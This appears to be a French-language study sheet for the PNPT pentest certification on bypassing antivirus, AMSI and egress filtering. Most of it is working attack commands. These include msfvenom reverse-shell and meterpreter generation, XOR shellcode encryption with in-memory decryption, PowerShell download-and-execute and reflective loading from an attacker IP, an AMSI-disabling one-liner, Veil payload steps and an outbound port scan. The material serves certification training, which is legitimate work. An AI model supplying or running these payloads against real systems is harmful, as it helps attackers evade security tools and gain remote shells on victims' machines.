# AV Evasion & Bypass

## Pourquoi c'est important pour la PNPT

L'examen exige de contourner l'antivirus et les restrictions egress pour compromettre le Domain Controller. Tes payloads standards (msfvenom par defaut) seront detectes.

## Concepts cles

- **Signature-based detection** : l'AV compare les fichiers a une base de signatures connues
- **Heuristic/Behavioral detection** : l'AV analyse le comportement du programme
- **Sandbox analysis** : l'AV execute le fichier dans un environnement isole
- **AMSI (Antimalware Scan Interface)** : interface Windows qui inspecte les scripts PowerShell, VBA, etc.

## Techniques de bypass

### 1. Obfuscation de payloads

```bash
# msfvenom avec encodage (basique, souvent detecte)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -e x64/zutto_dekiru -i 5 -f exe -o payload.exe

# Mieux : generer du shellcode brut et l'encapsuler soi-meme
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f raw -o shellcode.bin
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f csharp
```

### 2. Chiffrement du shellcode

Chiffrer le shellcode (AES, XOR) et le dechiffrer en memoire a l'execution.

```python
# Exemple XOR simple en Python
key = 0x41
encrypted = bytes([b ^ key for b in shellcode])
```

```csharp
// En C# : dechiffrer et executer en memoire
byte[] buf = new byte[] { /* shellcode chiffre */ };
for (int i = 0; i < buf.Length; i++) {
    buf[i] = (byte)(buf[i] ^ 0x41);
}
```

### 3. Execution en memoire (fileless)

Eviter d'ecrire le payload sur le disque.

```powershell
# Charger et executer en memoire
IEX (New-Object Net.WebClient).DownloadString('http://IP/script.ps1')

# Reflection Assembly (charger un .NET en memoire)
$data = (New-Object Net.WebClient).DownloadData('http://IP/payload.exe')
[System.Reflection.Assembly]::Load($data)
```

### 4. Bypass AMSI

```powershell
# Technique de base (peut etre detectee, variantes necessaires)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Alternatives : patcher AMSI en memoire, utiliser des outils dedies
```

### 5. Outils de generation de payloads evasifs

| Outil         | Description                                    |
|---------------|------------------------------------------------|
| **Veil**      | Framework de generation de payloads evasifs    |
| **Villain**   | Generateur de reverse shells evasifs           |
| **Nim**       | Compiler des payloads en Nim (moins detecte)   |
| **Rust**      | Compiler des payloads en Rust                  |
| **ScareCrow** | Loader de shellcode avec bypass EDR            |
| **Havoc C2**  | Framework C2 avec evasion integree             |

### 6. Veil Framework

```bash
veil
use 1                    # Evasion
list                     # Lister les payloads
use python/meterpreter/rev_tcp.py
set LHOST IP
set LPORT 4444
generate
```

## Contournement egress (sortie reseau)

Si le reseau bloque certains ports en sortie :

```bash
# Utiliser des ports courants autorises
# Port 80 (HTTP), 443 (HTTPS), 53 (DNS)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f exe -o shell.exe

# Tunnel DNS (si seul DNS est autorise)
# dnscat2, iodine

# Tunnel HTTP/HTTPS
# Cobalt Strike, Havoc C2, ou reverse shell sur port 443
```

### Tester les ports de sortie

```bash
# Sur la cible (PowerShell)
1..1024 | % { echo ((New-Object Net.Sockets.TcpClient).Connect("IP_ATTAQUANT", $_)) "$_ open" } 2>$null
```

## Bonnes pratiques pour l'examen

1. **Ne pas utiliser les payloads msfvenom bruts** : ils sont detectes
2. **Tester ses payloads** avant de les envoyer sur la cible
3. **Utiliser des ports courants** (443, 80, 53) pour les reverse shells
4. **Preferer l'execution en memoire** quand c'est possible
5. **Avoir plusieurs techniques pretes** au cas ou une est detectee
